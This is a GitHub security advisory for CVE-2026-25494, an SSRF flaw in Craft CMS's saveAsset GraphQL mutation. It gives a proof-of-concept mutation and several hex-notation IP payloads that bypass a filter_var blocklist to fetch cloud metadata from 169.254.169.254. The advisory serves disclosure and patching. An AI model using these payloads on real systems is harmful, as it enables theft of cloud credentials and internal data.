# [M] Craft CMS Vulnerable to SSRF in GraphQL Asset Mutation via Alternative IP Notation

## Summary
Severity: Medium
Advisory: GHSA-m5r2-8p9x-hp5m
CVE: CVE-2026-25494
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X (CVSS_V4)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-m5r2-8p9x-hp5m
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=5.0.0-RC1 <5.8.22
- Packagist: `craftcms/cms` — affected >=4.0.0-RC1 <4.16.18

## Details
I observed a [recent commit](https://github.com/craftcms/cms/commit/9d9b46a9e40cbdfb20d0d933abb546be12ccd3af) intended to mitigate Server-Side Request Forgery (SSRF) vulnerabilities. While the implemented defense mechanisms are an improvement, I have identified two methods to bypass these protections. This report details the first bypass method involving alternative IP notation, while the second method will be submitted in a separate advisory.

---
## Summary

The `saveAsset` GraphQL mutation uses `filter_var(..., FILTER_VALIDATE_IP)` to block a specific list of IP addresses. However, alternative IP notations (hexadecimal, mixed) are not recognized by this function, allowing attackers to bypass the blocklist and access cloud metadata services.

---
## Proof of Concept
1. Send the following GraphQL mutation:
```graphql
mutation {
    save_images_Asset(_file: { 
        url: "http://169.254.0xa9fe/latest/meta-data/"
        filename: "metadata.txt"
    }) {
        id
    }
}
```
2. The IP validation passes (hex notation not recognized as IP)
3. Guzzle resolves `169.254.0xa9fe` to `169.254.169.254`
4. Cloud metadata is fetched and saved

### Alternative Payloads
| Payload | Notation | Resolves To |
|---------|----------|-------------|
| `http://169.254.0xa9fe/` | Mixed (decimal + hex) | 169.254.169.254 |
| `http://0xa9.0xfe.0xa9.0xfe/` | Full hex dotted | 169.254.169.254 |
| `http://0xa9fea9fe/` | Single hex integer | 169.254.169.254 |

---
## Technical Details

**File:** `src/gql/resolvers/mutations/Asset.php`
**Root Cause:** `filter_var($hostname, FILTER_VALIDATE_IP)` only recognizes standard dotted-decimal notation. Hex representations bypass this check, but Guzzle still resolves them.

```php
// Line 287 - Fails to catch hex notation
filter_var($hostname, FILTER_VALIDATE_IP)
```

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-m5r2-8p9x-hp5m
- https://nvd.nist.gov/vuln/detail/CVE-2026-25494
- https://github.com/craftcms/cms/commit/d49e93e5ba0c48939ce5eaa6cd9b4a990542d8b2
- https://github.com/craftcms/cms
- https://github.com/craftcms/cms/releases/tag/4.16.18
- https://github.com/craftcms/cms/releases/tag/5.8.22
